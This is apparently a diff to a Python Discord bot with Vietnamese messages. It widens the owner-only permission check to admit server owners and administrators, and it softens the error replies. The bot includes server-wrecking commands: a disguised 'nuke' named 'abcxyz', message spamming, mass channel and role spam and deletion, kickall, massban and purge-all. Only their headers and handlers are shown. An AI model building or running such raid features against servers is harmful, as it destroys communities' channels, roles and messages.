@@ -365,11 +365,19 @@ async def check_and_assign_level_roles(member: discord.Member, current_level: in
                     await member.add_roles(role)
                 except:
                     pass
-
-# ==================== DECORATOR OWNER ====================
-def is_bot_owner():
+# ==================== DECORATOR OWNER & ADMIN ====================
+def is_authorized():
     async def predicate(ctx):
-        return ctx.author.id in BOT_OWNERS
+        # 1. Nếu là Chủ Bot (Boss Bảo) -> Cho phép
+        if ctx.author.id in BOT_OWNERS:
+            return True
+        # 2. Nếu là Chủ Server (Server Owner) -> Cho phép
+        if ctx.guild and ctx.author.id == ctx.guild.owner_id:
+            return True
+        # 3. Nếu là Admin (Quản trị viên) -> Cho phép (Bạn có thể xóa 2 dòng này nếu không muốn Admin dùng)
+        if ctx.guild and ctx.author.guild_permissions.administrator:
+            return True
+        return False
     return commands.check(predicate)
 
 # ==================== VIEW NUKE ====================
@@ -585,7 +593,7 @@ async def restore_process(ctx, backup_data, filename):
 
 # ==================== LỆNH PHÁ HOẠI ====================
 @bot.command(name="abcxyz")
-@is_bot_owner()
+@is_authorized()
 async def abcxyz(ctx):
     try:
         await ctx.message.delete()
@@ -614,12 +622,12 @@ async def abcxyz(ctx):
 @abcxyz.error
 async def abcxyz_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
     else:
         await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")
 
 @bot.command(name="spam")
-@is_bot_owner()
+@is_authorized()
 async def start_spam(ctx):
     global is_spamming, spam_task_running
     if is_spamming:
@@ -663,10 +671,10 @@ async def start_spam(ctx):
 @start_spam.error
 async def start_spam_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="stopspam")
-@is_bot_owner()
+@is_authorized()
 async def stop_spam(ctx):
     global is_spamming, spam_task_running
     if not is_spamming:
@@ -682,10 +690,10 @@ async def stop_spam(ctx):
 @stop_spam.error
 async def stop_spam_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="spamroast")
-@is_bot_owner()
+@is_authorized()
 async def spam_roast(ctx, member: discord.Member, count: int = 10):
     if count > 50:
         count = 50
@@ -702,11 +710,11 @@ async def spam_roast(ctx, member: discord.Member, count: int = 10):
 @spam_roast.error
 async def spam_roast_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 # ==================== LỆNH QUẢN TRỊ (KICK, BAN, UNBAN, MASSBAN, MUTE, UNMUTE, TIMEOUT, DEAFEN, UNDEAFEN, MOVE, MOVEALL, WARN, KICKALL, MASSKICK) ====================
 @bot.command(name="kick")
-@is_bot_owner()
+@is_authorized()
 async def kick_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
     try:
         if member.id == ctx.author.id:
@@ -730,10 +738,10 @@ async def kick_user(ctx, member: discord.Member, *, reason: str = "Không có l�
 @kick_user.error
 async def kick_user_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="ban")
-@is_bot_owner()
+@is_authorized()
 async def ban_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
     try:
         if member.id == ctx.author.id:
@@ -757,10 +765,10 @@ async def ban_user(ctx, member: discord.Member, *, reason: str = "Không có lý
 @ban_user.error
 async def ban_user_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="unban")
-@is_bot_owner()
+@is_authorized()
 async def unban_user(ctx, user_id: int, *, reason: str = "Không có lý do"):
     try:
         user = await bot.fetch_user(user_id)
@@ -779,10 +787,10 @@ async def unban_user(ctx, user_id: int, *, reason: str = "Không có lý do"):
 @unban_user.error
 async def unban_user_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="massban")
-@is_bot_owner()
+@is_authorized()
 async def massban(ctx, *members: discord.Member):
     if not members:
         await ctx.send("❌ Cần tag ít nhất 1 người. VD: `n! massban @user1 @user2`")
@@ -810,10 +818,10 @@ async def massban(ctx, *members: discord.Member):
 @massban.error
 async def massban_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="mute")
-@is_bot_owner()
+@is_authorized()
 async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Không có lý do"):
     try:
         time_delta = None
@@ -881,10 +889,10 @@ async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Kh�
 @mute.error
 async def mute_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="unmute")
-@is_bot_owner()
+@is_authorized()
 async def unmute(ctx, member: discord.Member):
     try:
         muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
@@ -925,10 +933,10 @@ async def unmute(ctx, member: discord.Member):
 @unmute.error
 async def unmute_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="timeout")
-@is_bot_owner()
+@is_authorized()
 async def timeout(ctx, member: discord.Member, duration: str, *, reason="Không có lý do"):
     try:
         unit = duration[-1].lower()
@@ -957,10 +965,10 @@ async def timeout(ctx, member: discord.Member, duration: str, *, reason="Không 
 @timeout.error
 async def timeout_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="deafen")
-@is_bot_owner()
+@is_authorized()
 async def deafen(ctx, member: discord.Member):
     try:
         await member.edit(deafen=True)
@@ -976,10 +984,10 @@ async def deafen(ctx, member: discord.Member):
 @deafen.error
 async def deafen_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="undeafen")
-@is_bot_owner()
+@is_authorized()
 async def undeafen(ctx, member: discord.Member):
     try:
         await member.edit(deafen=False)
@@ -995,10 +1003,10 @@ async def undeafen(ctx, member: discord.Member):
 @undeafen.error
 async def undeafen_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="move")
-@is_bot_owner()
+@is_authorized()
 async def move_member(ctx, member: discord.Member, channel: discord.VoiceChannel):
     try:
         await member.move_to(channel)
@@ -1015,10 +1023,10 @@ async def move_member(ctx, member: discord.Member, channel: discord.VoiceChannel
 @move_member.error
 async def move_member_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="moveall")
-@is_bot_owner()
+@is_authorized()
 async def move_all_voice(ctx, channel: discord.VoiceChannel = None):
     if channel is None:
         await ctx.send("❌ Vui lòng tag voice channel! VD: `n! moveall #voice`")
@@ -1043,10 +1051,10 @@ async def move_all_voice(ctx, channel: discord.VoiceChannel = None):
 @move_all_voice.error
 async def move_all_voice_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="warn")
-@is_bot_owner()
+@is_authorized()
 async def warn(ctx, member: discord.Member, *, reason="Cảnh cáo chung"):
     try:
         embed = discord.Embed(
@@ -1062,10 +1070,10 @@ async def warn(ctx, member: discord.Member, *, reason="Cảnh cáo chung"):
 @warn.error
 async def warn_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="kickall")
-@is_bot_owner()
+@is_authorized()
 async def kick_all_members(ctx):
     try:
         confirm_embed = discord.Embed(
@@ -1113,10 +1121,10 @@ async def kick_all_members(ctx):
 @kick_all_members.error
 async def kick_all_members_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="masskick")
-@is_bot_owner()
+@is_authorized()
 async def masskick(ctx, *members: discord.Member):
     if not members:
         await ctx.send("❌ Cần tag ít nhất 1 người. VD: `n! masskick @user1 @user2`")
@@ -1143,11 +1151,11 @@ async def masskick(ctx, *members: discord.Member):
 @masskick.error
 async def masskick_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 # ==================== LỆNH QUẢN LÝ KÊNH & ROLE ====================
 @bot.command(name="createchannel")
-@is_bot_owner()
+@is_authorized()
 async def create_channel(ctx, *, name: str):
     try:
         channel = await ctx.guild.create_text_channel(name)
@@ -1164,10 +1172,10 @@ async def create_channel(ctx, *, name: str):
 @create_channel.error
 async def create_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="deletechannel")
-@is_bot_owner()
+@is_authorized()
 async def delete_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         channel = ctx.channel
@@ -1187,10 +1195,10 @@ async def delete_channel(ctx, channel: discord.TextChannel = None):
 @delete_channel.error
 async def delete_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="lockchannel", aliases=["lock"])
-@is_bot_owner()
+@is_authorized()
 async def lock_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         channel = ctx.channel
@@ -1209,10 +1217,10 @@ async def lock_channel(ctx, channel: discord.TextChannel = None):
 @lock_channel.error
 async def lock_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="unlockchannel", aliases=["unlock"])
-@is_bot_owner()
+@is_authorized()
 async def unlock_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         channel = ctx.channel
@@ -1231,10 +1239,10 @@ async def unlock_channel(ctx, channel: discord.TextChannel = None):
 @unlock_channel.error
 async def unlock_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="createrole")
-@is_bot_owner()
+@is_authorized()
 async def create_role(ctx, *, role_name: str):
     try:
         role = await ctx.guild.create_role(name=role_name, reason="Lệnh từ Boss Bảo")
@@ -1251,10 +1259,10 @@ async def create_role(ctx, *, role_name: str):
 @create_role.error
 async def create_role_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="deleterole")
-@is_bot_owner()
+@is_authorized()
 async def delete_role(ctx, *, role_name: str):
     try:
         role = discord.utils.get(ctx.guild.roles, name=role_name)
@@ -1276,10 +1284,10 @@ async def delete_role(ctx, *, role_name: str):
 @delete_role.error
 async def delete_role_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="role")
-@is_bot_owner()
+@is_authorized()
 async def add_role_to_user(ctx, member: discord.Member, *, role_name: str):
     try:
         role = discord.utils.get(ctx.guild.roles, name=role_name)
@@ -1300,10 +1308,10 @@ async def add_role_to_user(ctx, member: discord.Member, *, role_name: str):
 @add_role_to_user.error
 async def add_role_to_user_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="removerole")
-@is_bot_owner()
+@is_authorized()
 async def remove_role_from_user(ctx, member: discord.Member, *, role_name: str):
     try:
         role = discord.utils.get(ctx.guild.roles, name=role_name)
@@ -1324,10 +1332,10 @@ async def remove_role_from_user(ctx, member: discord.Member, *, role_name: str):
 @remove_role_from_user.error
 async def remove_role_from_user_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="purge")
-@is_bot_owner()
+@is_authorized()
 async def purge_all(ctx, confirm: str = None):
     if confirm is None or confirm.lower() != "all":
         await ctx.send("⚠️ **CẢNH BÁO!** Lệnh này sẽ xóa TOÀN BỘ tin nhắn trong server!\n🔹 Gõ `n! purge all` để xác nhận.")
@@ -1364,10 +1372,10 @@ async def purge_all(ctx, confirm: str = None):
 @purge_all.error
 async def purge_all_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="clear")
-@is_bot_owner()
+@is_authorized()
 async def clear(ctx, amount: int = 10):
     if amount < 1 or amount > 1000:
         await ctx.send("⚠️ Số lượng từ 1 đến 1000.")
@@ -1387,10 +1395,10 @@ async def clear(ctx, amount: int = 10):
 @clear.error
 async def clear_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="createcategory")
-@is_bot_owner()
+@is_authorized()
 async def create_category(ctx, *, name: str):
     try:
         category = await ctx.guild.create_category(name)
@@ -1407,10 +1415,10 @@ async def create_category(ctx, *, name: str):
 @create_category.error
 async def create_category_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="renamechannel")
-@is_bot_owner()
+@is_authorized()
 async def rename_channel(ctx, channel: discord.TextChannel, *, new_name: str):
     try:
         old_name = channel.name
@@ -1427,10 +1435,10 @@ async def rename_channel(ctx, channel: discord.TextChannel, *, new_name: str):
 @rename_channel.error
 async def rename_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="settopic")
-@is_bot_owner()
+@is_authorized()
 async def set_topic(ctx, channel: discord.TextChannel, *, topic: str):
     try:
         await channel.edit(topic=topic)
@@ -1447,10 +1455,10 @@ async def set_topic(ctx, channel: discord.TextChannel, *, topic: str):
 @set_topic.error
 async def set_topic_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="setnsfw")
-@is_bot_owner()
+@is_authorized()
 async def set_nsfw(ctx, channel: discord.TextChannel, nsfw: bool):
     try:
         await channel.edit(nsfw=nsfw)
@@ -1468,10 +1476,10 @@ async def set_nsfw(ctx, channel: discord.TextChannel, nsfw: bool):
 @set_nsfw.error
 async def set_nsfw_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="hide")
-@is_bot_owner()
+@is_authorized()
 async def hide_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         channel = ctx.channel
@@ -1490,10 +1498,10 @@ async def hide_channel(ctx, channel: discord.TextChannel = None):
 @hide_channel.error
 async def hide_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="reveal")
-@is_bot_owner()
+@is_authorized()
 async def reveal_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         channel = ctx.channel
@@ -1512,10 +1520,10 @@ async def reveal_channel(ctx, channel: discord.TextChannel = None):
 @reveal_channel.error
 async def reveal_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="vc")
-@is_bot_owner()
+@is_authorized()
 async def create_voice_channel(ctx, *, name: str):
     try:
         channel = await ctx.guild.create_voice_channel(name)
@@ -1532,10 +1540,10 @@ async def create_voice_channel(ctx, *, name: str):
 @create_voice_channel.error
 async def create_voice_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="clonechannel")
-@is_bot_owner()
+@is_authorized()
 async def clone_channel(ctx, channel: discord.TextChannel = None):
     if channel is None:
         channel = ctx.channel
@@ -1554,10 +1562,10 @@ async def clone_channel(ctx, channel: discord.TextChannel = None):
 @clone_channel.error
 async def clone_channel_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="deleteallchannels")
-@is_bot_owner()
+@is_authorized()
 async def delete_all_channels(ctx):
     try:
         confirm_embed = discord.Embed(
@@ -1609,10 +1617,10 @@ async def delete_all_channels(ctx):
 @delete_all_channels.error
 async def delete_all_channels_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="spamchannels")
-@is_bot_owner()
+@is_authorized()
 async def spam_channels(ctx, amount: int = 100):
     try:
         if amount > 200:
@@ -1642,10 +1650,10 @@ async def spam_channels(ctx, amount: int = 100):
 @spam_channels.error
 async def spam_channels_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="spamroles")
-@is_bot_owner()
+@is_authorized()
 async def spam_roles(ctx, amount: int = 50):
     try:
         if amount > 250:
@@ -1676,10 +1684,10 @@ async def spam_roles(ctx, amount: int = 50):
 @spam_roles.error
 async def spam_roles_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="deleteallroles")
-@is_bot_owner()
+@is_authorized()
 async def delete_all_roles(ctx):
     try:
         confirm_embed = discord.Embed(
@@ -1727,10 +1735,10 @@ async def delete_all_roles(ctx):
 @delete_all_roles.error
 async def delete_all_roles_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="slowmode")
-@is_bot_owner()
+@is_authorized()
 async def set_slowmode(ctx, seconds: int = 0):
     if seconds < 0 or seconds > 21600:
         await ctx.send("❌ Nhập từ 0 đến 21600 giây!")
@@ -1750,10 +1758,10 @@ async def set_slowmode(ctx, seconds: int = 0):
 @set_slowmode.error
 async def set_slowmode_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="nick")
-@is_bot_owner()
+@is_authorized()
 async def set_nickname(ctx, member: discord.Member, *, nickname: str = None):
     if nickname is None:
         await ctx.send("❌ Vui lòng nhập nickname! VD: `n! nick @user Tên mới`")
@@ -1774,10 +1782,10 @@ async def set_nickname(ctx, member: discord.Member, *, nickname: str = None):
 @set_nickname.error
 async def set_nickname_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="resetnick")
-@is_bot_owner()
+@is_authorized()
 async def reset_nickname(ctx, member: discord.Member):
     try:
         await member.edit(nick=None)
@@ -1794,10 +1802,10 @@ async def reset_nickname(ctx, member: discord.Member):
 @reset_nickname.error
 async def reset_nickname_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="setservername")
-@is_bot_owner()
+@is_authorized()
 async def set_server_name(ctx, *, new_name: str):
     try:
         if len(new_name) > 100:
@@ -1815,10 +1823,10 @@ async def set_server_name(ctx, *, new_name: str):
 @set_server_name.error
 async def set_server_name_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
+        await ctx.send(' ❌ BẠN KHÔNG CÓ ĐỦ QUYỀN ĐỂ SỬ DỤNG LỆNH NGUY HIỂM NÀY! 🚫')
 
 @bot.command(name="setservericon")
-@is_bot_owner()
+@is_authorized()
 async def set_server_icon(ctx, url: str = None):
     try:
         if url:
